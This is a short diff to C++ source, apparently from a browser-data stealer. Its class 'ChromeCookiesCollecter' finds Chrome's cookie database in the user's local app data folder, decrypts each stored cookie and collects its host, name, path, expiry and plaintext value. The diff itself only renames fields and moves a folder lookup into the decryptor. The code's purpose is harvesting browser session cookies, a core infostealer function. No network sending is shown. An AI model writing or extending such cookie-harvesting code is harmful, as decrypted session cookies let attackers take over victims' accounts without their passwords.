@@ -55,15 +55,15 @@ void ChromeCookiesCollecter::collectFromPath(const String& chromePath)
 			continue;
 
 		//fill inforamtion
-		data.HostKey = host_key;
-		data.Name = name;
-		data.Path = path;
-		data.ExpireUTC= expiresUtc;
+		data.hostKey = host_key;
+		data.name = name;
+		data.path = path;
+		data.expireUTC= expiresUtc;
 		
 		String decCookie;
 		//decrypt cookie
 		if (m_decryptor.decrypt(encryptedCookie, decCookie, sqlite3_column_bytes(stmt, 3)))
-			data.Value = decCookie;
+			data.value = decCookie;
 
 		m_collectedData.emplace_back(data);
 	}
@@ -74,7 +74,7 @@ void ChromeCookiesCollecter::collectFromPath(const String& chromePath)
 bool ChromeCookiesCollecter::getDbPath(const String& chromePath)
 {
 	const int localData = 0x001c;
-	std::string path = IO::get_app_folder(localData);
+	std::string path = m_decryptor.getAppFolder(localData);
 	if (path.empty())
 		return false;
 	m_chromeSqlitePath = path;
